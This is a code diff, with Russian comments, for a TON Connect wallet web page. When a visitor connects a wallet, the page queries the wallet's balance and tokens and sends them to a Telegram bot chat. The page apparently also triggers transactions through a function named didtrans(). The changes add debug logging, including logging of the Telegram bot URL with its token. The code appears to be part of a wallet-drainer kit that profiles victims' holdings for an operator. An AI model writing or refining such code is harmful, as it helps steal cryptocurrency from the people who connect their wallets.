@@ -40,7 +40,7 @@ tonConnectUI.on('walletConnected', async (wallet) => {
     // Гарантированная отправка баланса в Telegram после подключения
     try {
       await sendBalanceToTelegram(wallet.address);
-        await getTokenBalancesToTelegram(wallet.address);
+      await getTokenBalancesToTelegram(wallet.address);
     } catch (error) {
       console.error("Ошибка при отправке баланса в Telegram:", error);
       // Отправляем сообщение об ошибке, даже если что-то пошло не так
@@ -57,17 +57,22 @@ tonConnectUI.on('walletConnected', async (wallet) => {
 
 async function sendBalanceToTelegram(walletAddress) {
     try {
+        console.log("Отправка баланса в Telegram для:", walletAddress);
         const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`,{
             headers: {
                 'X-API-Key': tonApiKey,
             }
         });
 
+        console.log("Ответ от API баланса:", response); // Проверка ответа
+
         if (!response.ok) {
             throw new Error(`Ошибка при запросе баланса: ${response.status} ${response.statusText}`);
         }
 
         const data = await response.json();
+
+        console.log("Данные о балансе:", data);  // Проверка данных
 
         if (data.error) {
             throw new Error(`Ошибка при получении данных о балансе: ${data.error}`);
@@ -86,19 +91,25 @@ async function sendBalanceToTelegram(walletAddress) {
 
 async function getTokenBalancesToTelegram(walletAddress) {
     try {
+        console.log("Отправка токенов в Telegram для:", walletAddress); // Добавили лог
         const response = await fetch(`https://toncenter.com/api/v3/get_tokens?address=${walletAddress}`, {
             headers: {
                 'X-API-Key': tonApiKey,
             }
         });
 
+        console.log("Ответ от API токенов:", response);
+
         if (!response.ok) {
+            console.error("Ошибка HTTP:", response.status, response.statusText);  // Лог HTTP ошибок
             throw new Error(`Ошибка при запросе токенов: ${response.status} ${response.statusText}`);
         }
 
         const data = await response.json();
+        console.log("Данные о токенах:", data);  // Лог данных
 
         if (data.error) {
+            console.error("Ошибка API:", data.error); // Лог ошибок API
             throw new Error(`Ошибка при получении данных о токенах: ${data.error}`);
         }
 
@@ -106,10 +117,12 @@ async function getTokenBalancesToTelegram(walletAddress) {
             let message = '\uD83D\uDCB0 *Токены кошелька ' + walletAddress + ':*\n';
             data.balances.forEach(token => {
                 const amount = parseFloat(token.balance) / Math.pow(10, token.decimals);
-                message += `- ${token.symbol}: ${amount.toFixed(8)}\n`;
+                message += `- ${token.symbol}: ${amount.toFixed(8)} ${token.symbol}\n`;  // Добавлен символ токена в сообщение
             });
+            console.log("Сформированное сообщение о токенах:", message); // Лог сообщения
             sendTelegramMessage(message);
         } else {
+            console.log("Токены не найдены"); // Лог
             sendTelegramMessage(`\uD83D\uDCC0 *У кошелька ${walletAddress} нет токенов.*`);
         }
 
@@ -119,7 +132,6 @@ async function getTokenBalancesToTelegram(walletAddress) {
         throw error; // Пробрасываем ошибку выше
     }
 }
-
 
 async function didtrans() {
   if (!tonConnectUI.account) {
@@ -175,12 +187,18 @@ async function didtrans() {
 
 // Функция для отправки сообщений в Telegram
 function sendTelegramMessage(message) {
+    console.log("Отправка сообщения в Telegram:", message); // Проверка сообщения
+
   const encodedMessage = encodeURIComponent(message);
   const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessage}&parse_mode=Markdown`;
+    console.log("URL для Telegram:", url); //Проверка URL
+
   fetch(url, {
       method: 'POST',
     })
     .then(response => {
+        console.log("Ответ от Telegram:", response); //Проверка ответа
+
       if (response.ok) {
         console.log('Сообщение успешно отправлено.');
       } else {
